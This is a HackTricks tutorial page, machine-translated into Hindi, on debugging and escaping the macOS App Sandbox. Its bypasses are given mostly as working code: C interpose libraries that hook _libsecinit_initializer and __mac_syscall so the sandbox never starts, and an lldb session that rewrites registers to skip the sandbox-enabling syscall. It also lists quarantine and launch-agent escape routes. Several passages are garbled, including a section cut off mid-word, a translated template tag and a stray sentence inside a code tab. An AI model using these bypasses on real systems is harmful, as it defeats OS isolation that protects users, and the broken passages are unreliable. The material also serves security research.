# macOS सैंडबॉक्स डीबग और बायपास

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन **HackTricks** में देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, **The PEASS Family** की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## सैंडबॉक्स लोडिंग प्रक्रिया

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>छवि स्रोत <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a> से</p></figcaption></figure>

पिछली छवि में दिखाया गया है कि **सैंडबॉक्स कैसे लोड होगा** जब एक एप्लिकेशन जिसमें एंटाइटलमेंट **`com.apple.security.app-sandbox`** हो, चलाया जाता है।

कंपाइलर `/usr/lib/libSystem.B.dylib` को बाइनरी से लिंक करेगा।

फिर, **`libSystem.B`** अन्य कई फ़ंक्शनों को बुलाएगा जब तक **`xpc_pipe_routine`** एप्लिकेशन की एंटाइटलमेंट को **`securityd`** को नहीं भेज देता। Securityd यह जांचेगा कि प्रक्रिया को सैंडबॉक्स में क्वारंटाइन किया जाना चाहिए, और अगर हां, तो यह क्वारंटाइन हो जाएगा।\
अंततः, सैंडबॉक्स को सक्रिय किया जाएगा जिसके लिए **`__sandbox_ms`** को कॉल किया जाएगा जो **`__mac_syscall`** को कॉल करेगा।

## संभावित बायपास

### क्वारंटाइन विशेषता को बायपास करना

**सैंडबॉक्स प्रक्रियाओं द्वारा बनाए गए फ़ाइलों** में सैंडबॉक्स से बचने के लिए **क्वारंटाइन विशेषता** जोड़ी जाती है। हालांकि, यदि आप **किसी सैंडबॉक्स एप्लिकेशन में क्वारंटाइन विशेषता के बिना एक `.app` फ़ोल्डर बना सकते हैं** तो आप एप्लिकेशन बंडल बाइनरी को **`/bin/bash`** पर पॉइंट कर सकते हैं और **प्लिस्ट** में कुछ env वेरिएबल्स जोड़ सकते हैं ताकि **`open`** का दुरुपयोग करके **नए एप्लिकेशन को सैंडबॉक्स के बाहर चलाया जा सके**।

यह वह काम था जो [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) में किया गया था।

{% hint style="danger" %}
इसलिए, इस समय, यदि आप केवल एक फ़ोल्डर बना सकते हैं जिसका नाम **`.app`** से समाप्त होता है बिना क्वारंटाइन विशेषता के, तो आप सैंडबॉक्स से बच सकते हैं क्योंकि macOS केवल **`.app` फ़ोल्डर** और **मुख्य एक्जीक्यूटेबल** में **क्वारंटाइन** विशेषता की **जांच** करता है (और हम मुख्य एक्जीक्यूटेबल को **`/bin/bash`** पर पॉइंट करेंगे)।

ध्यान दें कि यदि किसी .app बंडल को पहले से ही चलाने की अनुमति दी गई है (इसमें चलाने के लिए अनुमति देने वाला झंडा है), तो आप इसका भी दुरुपयोग कर सकते हैं... केवल अब आप **`.app`** बंडल के अंदर लिखने की अनुमति नहीं है जब तक आपके पास कुछ प्रिविलेज्ड TCC पर्म्स (जो आपके पास सैंडबॉक्स हाई के अंदर नहीं होंगे) नहीं हैं।
{% endhint %}

### ओपन कार्यक्षमता का दुरुपयोग

[**वर्ड सैंडबॉक्स बायपास के अंतिम उदाहरणों**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) में देखा जा सकता है कि **`open`** cli कार्यक्षमता का दुरुपयोग सैंडबॉक्स को बायपास करने के लिए किया जा सकता है।

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### लॉन्च एजेंट/डेमन्स

यदि एक एप्लिकेशन **सैंडबॉक्स में होने की योजना बनाई गई है** (`com.apple.security.app-sandbox`), तो यदि यह **लॉन्च एजेंट** (`~/Library/LaunchAgents`) से चलाया जाता है तो सैंडबॉक्स को बायपास करना संभव है।\
जैसा कि [**इस पोस्ट**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) में स्पष्ट किया गया है, यदि आप एक सैंडबॉक्स एप्लिकेशन के साथ स्थायित्व प्राप्त करना चाहते हैं तो आप उसे स्वचालित रूप से एक्जीक्यूट करने के लिए लॉन्च एजेंट के रूप में कार्यान्वित कर सकते हैं और शायद DyLib वातावरण वेरिएबल्स के माध्यम से दुरुपयोग करके दुर्भाग्यपूर्ण कोड इंजेक्ट कर सकते हैं।

### ऑटो स्टार्ट स्थानों का दुरुपयोग

यदि एक सैंडबॉक्स प्रक्रिया **जगह में लिख सकती है** जहां **बाद में एक सैंडबॉक्स के बाहर चलने वाला एप्लिकेशन बाइनरी चलेगा**, तो वह वहां बाइनरी रखकर **बस बच सकेगा**। इस प्रकार की स्थानों का एक अच्छा उदाहरण है `~/Library/LaunchAgents` या `/System/Library/LaunchDaemons`।

इसके लिए आपको **2 कदम** भी चाहिए हो सकते हैं: एक प्रक्रिया को एक **अधिक अनुमतिपूर्ण सैंडबॉक्स** (`file-read*`, `file-write*`) के साथ अपना कोड चलाने के लिए करना होगा जो वास्तव में एक स्थान में लिखेगा जहां वह **सैंडबॉक्स के बाहर चलाया जाएगा**।

इस पृष्ठ के बारे में जांचें **ऑटो स्टार्ट स्थान**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### अन्य प्रक्रियाओं का दुरुपयोग

यदि सैंडबॉक्स प्रक्रिया से आप **कम संकुचित सैंडबॉक्स** (या कोई नहीं) में चल रही अन्य प्रक्रियाओं को **कंप्रमाइज़** कर सकते हैं, तो आप उनके सैंडबॉक्स से बाहर निकल सकेंगे:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### स्थैतिक कंपाइलिंग और गतिशील लिंकिंग

[**इस शोध**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ने सैंडबॉक्स को बायपास करने के 2 तरीके खोजे। क्योंकि सैंडबॉक्स यूज़रलैंड से लागू होता ह
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### अधिकार

ध्यान दें कि कुछ **क्रियाएँ** संदर्भ में किसी विशेष **अधिकार** के साथ एक संडबॉक्स में **अनुमति दी जा सकती हैं**, जैसे:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### इंटरपोस्टिंग बायपास

अधिक जानकारी के लिए **इंटरपोस्टिंग** की जाँच करें:

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### सैंडबॉक्स को रोकने के लिए `_libsecinit_initializer` को इंटरपोस्ट करें
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### सैंडबॉक्स को रोकने के लिए `__mac_syscall` को इंटरपोस्ट करें

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### सैंडबॉक्स को lldb के साथ डिबग और बायपास करें

चलो एक एप्लिकेशन को कंपाइल करें जो सैंडबॉक्स में होना चाहिए:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% टैब शीर्षक = "अधिकार" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %}यहाँ विशेष निर्देश हैं।{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

फिर ऐप को कंपाइल करें:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
ऐप **`~/Desktop/del.txt`** फ़ाइल **पढ़ने** की कोशिश करेगा, जिसे **Sandbox अनुमति नहीं देगा**।\
वहाँ एक फ़ाइल बनाएं क्योंकि एक बार Sandbox को उल्टा दिया जाएगा, तो यह इसे पढ़ सकेगा:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

चलो एप्लिकेशन को डिबग करें ताकि हम देख सकें कि सैंडबॉक्स कब लोड होता है:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**सैंडबॉक्स को छलकर भी TCC** उपयोगकर्ता से पूछेगा कि क्या वह प्रक्रिया को डेस्कटॉप से फ़ाइलें पढ़ने की अनुमति देना चाहता है
{% endhint %}

## संदर्भ

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित हो** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
